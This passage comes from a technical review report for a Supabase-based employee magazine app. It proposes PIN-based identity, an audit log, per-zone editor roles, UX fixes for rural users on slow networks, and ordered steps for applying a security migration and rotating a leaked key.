Admin uploads the roster CSV once (1,000 rows). Employees enter `emp_id + 4-digit PIN` at first submission → PIN is verified, the form auto-fills `emp_name` and `zone_slug`. No impersonation, no PII enumeration, one extra field.

For "My Submissions," the PIN doubles as the auth: `emp_id + PIN → signed token → read submissions`. No URL-parameter leak.

### 9.2 Scalable data fetching

Replace the single `getPublished()` with `getHomepage(zone)` that fetches per-section in parallel with row limits (see 5.1). On 3G, 9 small requests race and cost less than one big request.

### 9.3 Hero and section as first-class entities

Today `section_slug='hero'` is a convention. Promote it:
```sql
alter table published_content
  add column is_hero boolean default false,
  add column hero_order int;
create index idx_pc_hero on published_content(is_hero, hero_order) where is_hero = true;
```
Then a post can be *both* in "Achievements" and *also* pinned to the hero — without losing its section. The current model forcibly re-categorizes hero posts, which is why `removeFromHero()` has that awkward "move back to original section" heuristic that guesses based on category.

### 9.4 Audit log

```sql
create table audit_log (
  id bigserial primary key,
  ts timestamptz default now(),
  admin_token text,                -- truncated to first 8 chars in logs
  action text,                     -- 'publish','unpublish','edit','reject'
  target_table text,
  target_id text,
  before jsonb,
  after jsonb
);
```
Every RPC writes here. When the magazine homepage shows "COMPANY LAYOFFS ANNOUNCED" at 3am, you can trace exactly which token did it.

### 9.5 Separate editor roles per zone (Phase 5 foundation)

`admin_sessions` already has a `label` column. Extend with:
```sql
alter table admin_sessions add column scope_zone text default 'all';
create function is_admin_for_zone(p_zone text) returns boolean ...;
```
Then the "edit submission" policy becomes `is_admin_for_zone(zone_slug)`. Gujarat editor can only publish Gujarat posts. Free upgrade — no new infra.

---

## 10. Product & UX Improvements

Ordered by impact-per-effort for rural employees.

1. **PIN-based identity (9.1)** — removes the "which employee ID am I again?" question, removes impersonation, removes PII leak in one move. Highest ROI.
2. **Offline-first homepage via service worker** — employees checking the magazine on a bus lose connection mid-scroll. A 50KB service worker caches the last fetched homepage JSON and the 9 section payloads. With demo fallback already in place, this is <100 lines of JS.
3. **Low-bandwidth images** — today the `<img>` tag loads whatever URL admin pasted. Pass through Supabase's built-in image transform: `?width=400&quality=70`. 80% smaller on rural 3G.
4. **Search by `emp_id` last 4 digits only** in "My Submissions" — reduces the PII shoulder-surfing risk (PIN still required).
5. **WhatsApp share button** — highest-ROI engagement feature per your Phase 3 plan; one `<a href="whatsapp://send?text=...">` per card. 6 lines of code total. Share-back URL uses a read-only deep link (no emp_id).
6. **Big-tap targets** — many buttons are 26×26 px (priority dots in admin, zone tabs). WCAG says 44×44. Rural users on cracked screens double-tap.
7. **Two-language toggle per zone** (Phase 5) — Marathi for Maharashtra, Kannada for Karnataka: add `title_ml`, `content_ml` columns, fall back to English.
8. **Remove broken "Voted!" button** — doesn't persist, misleads users. Either wire it up to a `reactions` table (+15 lines) or drop it.
9. **Admin: bulk publish** — today each publish is one click + one section pick. After approving 20 birthdays, 20 clicks. Add multi-select → "Publish all selected to Birthdays" — already half-built (the bulk bar exists for approve/reject).
10. **Admin: "publish on a schedule"** — `published_at` in the future + a cron job that flips `is_active=true` at that time. Lets editors queue Monday's content on Sunday evening. Free via Supabase scheduled edge functions.
11. **Empty-state copy matters** — "No submissions found" is generic. "Looks like you haven't shared anything yet — [big orange button] Share Your First Story" converts.
12. **Don't kill the session every 8 hours silently** — admin in the middle of rejecting 40 submissions, token expires, next click = 401, no feedback. Intercept 401 → show "Session expired, sign in again" modal → preserve their in-progress rejection.

---

## 11. File Delivery

All revised files are in this directory. Apply in this order:

1. Back up your current Supabase DB (snapshot in dashboard).
2. Run the `schema.sql` block in Section 8 of this report (the security migration) against your DB.
3. Set the admin password: `insert into admin_credentials (password_hash) values (crypt('your-new-strong-password', gen_salt('bf', 10)));`
4. Replace `supabase.js`, `admin.html`, `index.html`, `submit.html`, `mysubs.html`, and `README.md` with the revised versions.
5. Test login, submit, publish, unpublish, zone switching in that order.
6. Rotate your Supabase anon key from the dashboard. The old key is still in your Git history — treat it as burned.
7. Delete `READMEp.md`.
